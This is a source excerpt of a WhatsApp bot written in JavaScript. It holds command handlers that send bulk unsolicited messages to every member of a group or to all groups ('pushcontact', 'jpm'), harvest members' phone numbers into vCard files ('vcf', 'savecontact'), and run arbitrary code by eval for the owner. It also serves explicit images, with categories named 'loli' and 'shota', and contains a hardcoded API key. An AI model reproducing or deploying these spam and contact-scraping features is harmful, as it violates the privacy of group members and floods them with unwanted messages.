if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
LordVoltage.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}}
break
case '>':if (prefix === '.') {
if (!DanzTheCreator) return reply(mess.only.owner)
var err = new TypeError
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return replynano(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
replynano(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replynano(util.format(_syntax + _err))
}}
break
case 'pushcontact': {if (prefix === '.') {
    const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
      if (!m.isGroup) return replynano(`The feature works only in grup`)
    if (!text) return replynano(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replynano(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    LordVoltage.sendMessage(pler, { text: q})
     }  
     replynano(`Done`)
      }}
      break
case 'pushcontact2':{if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!q) return replynano(`Incorrect Usage Please Use Command Like This\n${prefix+command} idgc|text`)
reply(mess.wait)
const metadata2 = await LordVoltage.groupMetadata(q.split("|")[0])
const halss = metadata2.participants
for (let mem of halss) {
LordVoltage.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] })
await sleep(5000)
}
replynano(`Success`)
}}
break

case 'pushcontact3':if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup|pause|text\nTo See Group Id Please Type .idgroup`)
await reply("Otw Boss ")
const groupMetadataa = !m.isGroup? await LordVoltage.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await LordVoltage.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv3 })
await sleep(q.split("|")[1])
} else {
await LordVoltage.sendMessage(mem, { text: global.tekspushkonv3 })
await sleep(q.split("|")[1])
}
}
reply("Success Boss!")}
break
case 'pushcontact4':if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} pause|text`)
await reply("wait Boss")
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv4 = text.split("|")[1]
for (let men of halsss) {
if (/image/.test(mime)) {
media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await LordVoltage.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 })
await sleep(text.split("|")[0])
} else {
await LordVoltage.sendMessage(men, { text: global.tekspushkonv4 })
await sleep(text.split("|")[0])
}
}
reply("Successful!")}
break

 case 'vcf':if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.isGroup) return reply(`This command is meant for groups`)
let cmiggc = await LordVoltage.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Import '+cmiggc.participants.length+' contact..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
LordVoltage.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)}
break

case 'cekidgc': {if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
let getGroups = await LordVoltage.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST OF GROUPS BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await LordVoltage.groupMetadata(x)
teks += `◉ No : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `To use, please type the command ${prefix}pushcontact3 id|text\n\nBefore using, please copy the group ID above.`)
}}
break
case 'savecontact': {if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Wrong Usage Please Use Command Like This\n${prefix+command} idgroup\nTo See Group Id Please Type .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await LordVoltage.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await LordVoltage.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "SHADØW.vcf", caption: "Success Just Save, Brother", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}}
break

case 'jpm':{if (prefix === '.') {
if (!DanzTheCreator) return reply(`This Cmd Is For Private Chat`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord_")
let getGroups = await LordVoltage.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await LordVoltage.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await LordVoltage.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await LordVoltage.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL*")
}}
break

case 'jpm2':{if (prefix === '.') {
if (!DanzTheCreator) return reply(`This Command Is For Private Chat`)
if (!text) return reply(`*Wrong Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Image To All Groups\nFor the delay, the nominal delay is 1000 = 1 second`)
await reply("_Wait, my lord_")
let getGroups = await LordVoltage.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await LordVoltage.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await LordVoltage.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await LordVoltage.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await LordVoltage.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL*")
}}
break

case 'sendcontact': case 'kontak':if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.isGroup) return reply(`Special Group`)
if (!m.mentionedJid[0]) return reply('Ex; .sendcontact @tag/no.')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
LordVoltage.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})}
break

case 'getcontact': case 'getkontak':if (prefix === '.') {
const hasPermission = checkGroupAdminPermission(m, reply, isGroupAdmins, DanzTheCreator);
        if (!hasPermission) {return;}
if (!m.isGroup) return reply(`This feature is group specific`)
huhuhs = await LordVoltage.sendMessage(m.chat, {
    text: `Group; *${groupMetadata.subject}*\nTotal participant; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); send all member contacts
LordVoltage.sendContact(m.chat, participants.map(a => a.id), huhuhs)}
break

            case 'id':{if (prefix === '.') {
            replynano(from)
           }}
          break
          case 'userjid':{if (prefix === '.') {
          	if(!DanzTheCreator) return reply(mess.only.owner)
        const groupMetadata = m.isGroup ? await LordVoltage.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replynano(textt)
    }}
    break
          case 'emojimix': {if (prefix === '.') {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replynano(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replynano(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await LordVoltage.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }}
	    break
	case 'hentaivid2': {if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
LordVoltage.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}}
break
	case 'hentaivid': case 'hentaivideo': {if (prefix === '.') {
	if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
const { hentai } = require('./lib/scraper.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
LordVoltage.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }}
            break
case 'trap' :if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })}
break
case 'hentai-neko' :
case 'hneko' :if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })}
break
case 'hentai-waifu' :
case 'hwaifu' :if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })}
break
case 'gasm':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })}
break  
case 'milf':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break 
case 'animespank':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await LordVoltage.sendMessage(m.chat, { caption:  `Here he is!!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})}
break
case 'ahegao':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/ahegao.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'ass':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/ass.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'bdsm':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/bdsm.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'blowjob':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'cuckold':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'cum':
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/cum.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'ero':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/ero.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'femdom':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/femdom.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'foot':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'gangbang':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/gangbang.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'glasses':if (prefix === '.') {
if (!isPrem) return replyprem(mess.premium)
reply(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./data/voltage/sparkmedia/nsfw/glasses.json'))
var xeonyresult = pickRandom(ahegaonsfw)
LordVoltage.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url } }, { quoted: m })}
break
case 'hentai': {
async function nhentaiScraper(id) {
	let uri = id ? `https://cin.guru/v/${+id}/` : 'https://cin.guru/'
	let html = (await axios.get(uri)).data
	return JSON.parse(html.split('<script id="__NEXT_DATA__" type="application/json">')[1].split('</script>')[0]).props.pageProps.data
}
function toPDF(images, opt = {}) {
	return new Promise(async (resolve, reject) => {
		if (!Array.isArray(images)) images = [images]
		let buffs = [], doc = new PDFDocument({ margin: 0, size: 'A4' })
		for (let x = 0; x < images.length; x++) {
			if (/.webp|.gif/.test(images[x])) continue
			let data = (await axios.get(images[x], { responseType: 'arraybuffer', ...opt })).data
			doc.image(data, 0, 0, { fit: [595.28, 841.89], align: 'center', valign: 'center' })
			if (images.length != x + 1) doc.addPage()
		}
		doc.on('data', (chunk) => buffs.push(chunk))
		doc.on('end', () => resolve(Buffer.concat(buffs)))
		doc.on('error', (err) => reject(err))
		doc.end()
	})
}
let code = ('123456')
if (!code) return reply('Input code')
	await reply('_In progress, please wait..._')
let data = await nhentaiScraper(code)
let pages = []
let thumb = `https://external-content.duckduckgo.com/iu/?u=https://t.nhentai.net/galleries/${data.media_id}/thumb.jpg`	
data.images.pages.map((v, i) => {
			let ext = new URL(v.t).pathname.split('.')[1]
			pages.push(`https://external-content.duckduckgo.com/iu/?u=https://i7.nhentai.net/galleries/${data.media_id}/${i + 1}.${ext}`)
		})
let buffer = await (await fetch(thumb)).buffer()		
